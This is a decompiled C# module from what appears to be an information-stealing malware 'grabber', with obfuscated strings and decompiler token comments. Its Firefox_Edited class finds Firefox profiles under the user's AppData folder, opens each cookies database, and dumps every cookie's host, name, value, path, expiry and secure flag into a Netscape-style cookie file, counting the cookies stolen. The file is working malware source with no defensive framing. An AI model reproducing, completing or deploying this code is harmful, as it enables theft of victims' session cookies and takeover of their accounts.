using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

namespace Application.Grabber.Browsers
{
	// Token: 0x02000015 RID: 21
	internal class Firefox_Edited
	{
		// Token: 0x17000026 RID: 38
		// (get) Token: 0x06000093 RID: 147 RVA: 0x000045FC File Offset: 0x000027FC
		// (set) Token: 0x06000094 RID: 148 RVA: 0x00004610 File Offset: 0x00002810
		public static int Cookies { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x06000095 RID: 149 RVA: 0x00004624 File Offset: 0x00002824
		[MethodImpl(MethodImplOptions.NoInlining)]
		public static List<FileObject> Execute()
		{
			List<FileObject> list = new List<FileObject>();
			List<FirefoxBrowserObject> list2 = new List<FirefoxBrowserObject>();
			foreach (string p in new List<string>
			{
				Paths.AppDataPath
			})
			{
				foreach (string text in delegate0e2.f0000e2(p, c0000c0.m00000f("òn\"\u000fÏ\f@\u0019ß\u0003\"E|ò"), SearchOption.AllDirectories))
				{
					list2.Add(new FirefoxBrowserObject(new DirectoryInfo(text.Replace(c0000c0.m00000f("òn\"\u000fÏ\f@\u0019ß\u0003\"E|ò"), c0000c0.m00000f(""))).Name, text));
				}
			}
			foreach (FirefoxBrowserObject firefoxBrowserObject in list2)
			{
				if (delegate0d2.f0000bf(firefoxBrowserObject.CookiesPath))
				{
					list.Add(Firefox_Edited.GetCookies(firefoxBrowserObject));
				}
			}
			return list;
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00004724 File Offset: 0x00002924
		[MethodImpl(MethodImplOptions.NoInlining)]
		private static FileObject GetCookies(FirefoxBrowserObject browserObject)
		{
			StringBuilder p = new StringBuilder();
			Sqlite sqlite = new Sqlite(browserObject.CookiesPath);
			if (!sqlite.ReadTable(c0000c0.m00000f("ün7;Å\u0006\\\\Å\u0017=")))
			{
				new Exception();
			}
			int rowCount = sqlite.GetRowCount();
			if (rowCount < 0)
			{
				new Exception();
			}
			for (int i = 0; i < rowCount; i++)
			{
				string value = sqlite.GetValue(i, c0000c0.m00000f("ç`!\u0011Ã"));
				string value2 = sqlite.GetValue(i, c0000c0.m00000f("ùn>\u0010"));
				string value3 = sqlite.GetValue(i, c0000c0.m00000f("ÿ` \u0001"));
				string value4 = sqlite.GetValue(i, c0000c0.m00000f("á`9\f"));
				string value5 = sqlite.GetValue(i, c0000c0.m00000f("òs(\u0005Ò\0\\Yø\u001b#I"));
				delegate0db f0000d = delegate0db.f0000d8;
				string value6 = sqlite.GetValue(i, c0000c0.m00000f("ør\u001e\u0001Å\u001cAR"));
				string text = c0000c0.m00000f("ÅS\u0018!");
				string text2 = f0000d(value6, c0000c0.m00000f("¡")) ? c0000c0.m00000f("×@\u00017ã") : c0000c0.m00000f("ÅS\u0018!");
				delegate0f7.f00010e(p, delegate0d1.f0000bd(new string[]
				{
					value2,
					c0000c0.m00000f("\u0098"),
					text,
					c0000c0.m00000f("\u0098"),
					value4,
					c0000c0.m00000f("\u0098"),
					text2,
					c0000c0.m00000f("\u0098"),
					value5,
					c0000c0.m00000f("\u0098"),
					value3,
					c0000c0.m00000f("\u0098"),
					value
				}));
				Firefox_Edited.Cookies++;
			}
			return new FileObject(c0000c0.m00000f("Ós\"\u0013Õ\fADð1!Ccþ(\u0014ÊÄ\a\u0014H¢uÕ\f") + browserObject.Name + c0000c0.m00000f("¿u5\u0010"), delegate0cd.f0000a6(p));
		}

		// Token: 0x06000097 RID: 151 RVA: 0x00004914 File Offset: 0x00002B14
		[MethodImpl(MethodImplOptions.NoInlining)]
		public Firefox_Edited()
		{
		}

		// Token: 0x06000098 RID: 152 RVA: 0x0000491C File Offset: 0x00002B1C
		// Note: this type is marked as 'beforefieldinit'.
		[MethodImpl(MethodImplOptions.NoInlining)]
		static Firefox_Edited()
		{
			c0000c0.Initialize();
			c0000c0.PostInitialize();
		}

		// Token: 0x04000030 RID: 48
		[CompilerGenerated]
		private static int f00001d;
	}
}
